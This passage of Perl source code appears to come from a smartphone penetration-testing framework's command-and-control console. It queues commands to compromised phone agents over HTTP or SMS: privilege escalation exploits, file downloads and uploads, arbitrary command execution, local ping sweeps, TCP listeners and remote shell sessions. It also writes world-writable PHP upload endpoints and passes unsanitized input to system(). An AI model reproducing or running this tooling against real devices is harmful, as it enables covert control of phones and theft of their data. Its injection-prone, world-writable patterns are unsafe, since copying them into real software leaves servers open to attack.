		print "\nReturn Method(SMS or HTTP)";
		print "\nspf>";
		$returnmethod = <>; 
		chomp($deliverymethod);
		chomp($returnmethod);
		if ($returnmethod eq "SMS")
		{
			$modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                      	{
				$command = $key . " " . "SMSS" . " " . $deliverymethod . " " . $returnmethod . " " .  $modem . "\n"; 
				if ($deliverymethod eq "HTTP")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;

				}	
				if ($deliverymethod eq "SMS")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;
				}
			}
			
		}
		if ($returnmethod eq "HTTP")
                {
                        if ($deliverymethod eq "HTTP")
                        {
				$command = $key . " SMSS " . $deliverymethod . " " . $returnmethod . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	last;
                        }
			if ($deliverymethod eq "SMS")
			{
				$modem = get_modem();
                        	if ($modem == 0)
                        	{
                                	print "\nNo modems found. Attach a modem to use this functionality\n";
                        	}
                        	else
                        	{
			 		$command = $key . " SMSS " . $deliverymethod . " " . $returnmethod . " " . $modem . "\n";
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;


				}
			}
		}
	}

}

sub root
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	#print "ROOT\n";
			
	while(1) 	
	{	
		print "\n\tTry a privilege escalation exploit.\n";
		print "Delivery Method (SMS or HTTP)";
		print "\nspf>";
		$delivery = <>;
		chomp($delivery);  
		if ($delivery eq "HTTP")
                {
                        $command = $key . " ROOT HTTP\n";
                        $control = $webserver . $path . "/putfunc";
                        open(CONTROLFILE, ">>$control");
                        print CONTROLFILE $command;
                        close(CONTROLFILE);
                        last;

                }
                if ($delivery eq "SMS")
                {
                        $modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                        {
                                $command = $key . " " . "ROOT SMS" . " " . $modem  . "\n";
 				$control = $webserver . $path . "/putfunc";
                                open(CONTROLFILE, ">>$control");
                                print CONTROLFILE $command;
                                close(CONTROLFILE);
                                last;
                	}

		

		}
		
	}
}

sub down
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tDownloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP).\n";
		print "File to download:";
		$filetocopy = <>;
		print "Hosting Path:";
		$wheretoputit = <>;
		print "Filename:";
		$filename = <>;
		print "\nDelivery Method(SMS or HTTP)";
		$deliverymethod = <>;
		chomp($filetocopy);
		chomp($wheretoputit); 
		chomp($deliverymethod);
		chomp($filename);
	$fullpath = $webserver . $wheretoputit;
	$command1 = "mkdir " . $fullpath;
        system($command1);
	$command = "cp " . $filetocopy . " " . $webserver . $wheretoputit . $filename;
	system($command);

		if ($deliverymethod eq "HTTP")
		{
			$command = $key . " " . "DOWN" . " " . "none" . " " . $deliverymethod . " " . $wheretoputit . " " . $filename . "\n";
			$control = $webserver . $path . "/putfunc";
			open(CONTROLFILE, ">>$control");
       		        print CONTROLFILE $command;
                        close(CONTROLFILE);
			last;

		}
		if ($deliverymethod eq "SMS")
		{
			$modem = get_modem();
			if ($modem == 0)
			{
				print "\nNo modems found. Attach a modem to use this functionality\n";
			}
			else
			{
				$command = $key . " " . "DOWN" . " " . $modem  . " " . $deliverymethod . " " . $wheretoputit . $filename . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                       	 	last;
		
			}


		}	

	}
}

sub run
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tRun a command in the terminal. Fill in the command and the delivery method(SMS or HTTP).\n";
		print "Command:";
		$commandtoexecute = <>;
		print "Downloaded?:";
		$downloaded = <>;
		print "\nDelivery Method(SMS or HTTP)";
		$deliverymethod = <>;
		chomp($commandtoexecute);
		chomp($deliverymethod);
		chomp($downloaded);
		if ($deliverymethod eq "HTTP")
		{
			$command = $key . " " . "EXEC" . " " . "none" . " " . $deliverymethod . " " . $downloaded . " " . $commandtoexecute . "\n";
			$control = $webserver . $path . "/putfunc";
			open(CONTROLFILE, ">>$control");
       		        print CONTROLFILE $command;
                        close(CONTROLFILE);
			last;

		}
		if ($deliverymethod eq "SMS")
		{
			$modem = get_modem();
			if ($modem == 0)
			{
				print "\nNo modems found. Attach a modem to use this functionality\n";
			}
			else
			{
				$command = $key . " " . "EXEC" . " " . $modem  . " " . $deliverymethod . " " . $downloaded . " " . $commandtoexecute . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                       	 	last;
		
			}


		}	

	}
}

sub ping
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};		
	while(1) 	
	{
		print "\n\tPing sweep the local network. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP).\n";
		print "\nDelivery Method(SMS or HTTP)";
		print "\nspf>";
		$deliverymethod = <>;
		print "\nReturn Method(SMS or HTTP)";
		print "\nspf>";
		$returnmethod = <>; 
		chomp($deliverymethod);
		chomp($returnmethod);
		if ($returnmethod eq "SMS")
		{
			$modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                      	{
				$command = $key . " " . "PING" . " " . $deliverymethod . " " . $returnmethod . " " .  $modem . "\n"; 
				if ($deliverymethod eq "HTTP")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;

				}	
				if ($deliverymethod eq "SMS")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;
				}
			}
			
		}
		if ($returnmethod eq "HTTP")
                {
                        if ($deliverymethod eq "HTTP")
                        {
				$command = $key . " PING " . $deliverymethod . " " . $returnmethod . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	last;
                        }
			if ($deliverymethod eq "SMS")
			{
				$modem = get_modem();
                        	if ($modem == 0)
                        	{
                                	print "\nNo modems found. Attach a modem to use this functionality\n";
                        	}
                        	else
                        	{
			 		$command = $key . " PING " . $deliverymethod . " " . $returnmethod . " " . $modem . "\n";
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;


				}
			}
		}
	}

}


sub upload
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
 	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tUpload a file\n";
		print "Delivery Method (SMS or HTTP)";
		$delivery = <>;
		chomp($delivery);
		print "Filename:";
		$filename = <>;
		chomp($filename);   
		if ($delivery eq "HTTP")
		{
			$command = $key . " UPLD HTTP " . $filename . " \n";
			$control = $webserver . $path . "/putfunc";
			open(CONTROLFILE, ">$control");
       		        print CONTROLFILE $command;
        		close(CONTROLFILE);	
			last;
		}
		if ($delivery eq "SMS")
		{
			$modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                        {
			$command = $key . " UPLD SMS " . $filename . " " . $modem . "\n";
                        $control = $webserver . $path . "/putfunc";
                        open(CONTROLFILE, ">$control");
                        print CONTROLFILE $command;
                        close(CONTROLFILE);
                        last;
	
			}
		}
		

	}
}

sub listener
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};		
	while(1) 	
	{
		print "\n\tOpen a TCP listener on the phone. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP) as well as the port to listen on.\n";
		print "\nDelivery Method(SMS or HTTP)";
		print "\nspf>";
		$deliverymethod = <>;
		print "\nReturn Method(SMS or HTTP)";
		print "\nspf>";
		$returnmethod = <>; 
		print "\nPort:";
		print "\nspf>";
		$port1 = <>;
		chomp($deliverymethod);
		chomp($returnmethod);
		chomp($port1);
		$fullpath = $webserver. $path;
		$com = $fullpath . "/" . $port1 . ".txt";
		$commd = "touch " . $com;
		system($commd); 
        $command7 = "chmod 777 " . $com;
        system($command7);
	$com = $fullpath . "/" . $port1 . "control";
		$commd = "touch " . $com;
		system($commd); 
        $command7 = "chmod 777 " . $com;
        system($command7);
$textupload = $fullpath . "/" . $port1 . "uploader.php";
        $command10 = "touch " . $textupload;
        system($command10);
        $command11 = "chmod 777 " . $textupload;
        system($command11);
        $textuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('" . $port1 . ".txt', 'ab');\nfwrite(\$file, \$base);\n?>";
        open(TEXTFILE, ">$textupload");
        print TEXTFILE $textuploadtext;
        close(TEXTFILE);
	$connectupload = $fullpath . "/" . $port1 . "controluploader.php";
        $command12 = "touch " . $connectupload;
        system($command12);
        $command13 = "chmod 777 " . $connectupload;
        system($command13);
        $connectuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('" . $port1 . "control','wb');\nfwrite(\$file, \$base);\n?>";
        open(CONNECTFILE, ">$connectupload");
        print CONNECTFILE $connectuploadtext;
        close(CONNECTFILE);
		if ($returnmethod eq "SMS")
		{
			$modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                      	{
				chomp($modem);
				$command = $key . " " . "LIST" . " " . $deliverymethod . " " . $returnmethod . " " .  $modem . " " . $port1 . "\n"; 
				if ($deliverymethod eq "HTTP")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;

				}	
				if ($deliverymethod eq "SMS")
				{
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;
				}
			}
			
		}
		if ($returnmethod eq "HTTP")
                {
                        if ($deliverymethod eq "HTTP")
                        {
				$command = $key . " LIST " . $deliverymethod . " " . $returnmethod . " none " . $port1 . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	last;
                        }
			if ($deliverymethod eq "SMS")
			{
				$modem = get_modem();
                        	if ($modem == 0)
                        	{
                                	print "\nNo modems found. Attach a modem to use this functionality\n";
                        	}
                        	else
                        	{
			 		$command = $key . " LIST " . $deliverymethod . " " . $returnmethod . " " . $modem . " " . $port1 . "\n";
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                        		last;


				}
			}
		}
	}

}

sub connectlisten
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};		
	while(1) 	
	{
		print "\n\tConnect to a TCP Listener from the agent.Enter the port number of the listener.\n";
		print "\nPort:";
		$port1 = <>;
		print "\nCommunication Method(HTTP or SMS):";
		$communication = <>;
		chomp($port1);
		chomp($communication);
		if (lc($communication) eq "sms")
			{
				$modem = get_modem();
                        	if ($modem == 0)
                        	{
                                	print "\nNo modems found. Attach a modem to use this functionality\n";
                        	}
                        	else
                        	{
		$command = "perl shellpoll.pl " . $path . " " . $port1 . " " . $communication . " " . $modem . " " . $key . " " . $number;
		system($command);
		last;
	}
	}
	elsif(lc($communication) eq "http")
	{
		$command = "perl shellpoll.pl " . $path . " " . $port1 . " " . $communication . " " . "none" . " " . $key . " " . $number;
		system($command);
		last;	
	}
	}
	
}
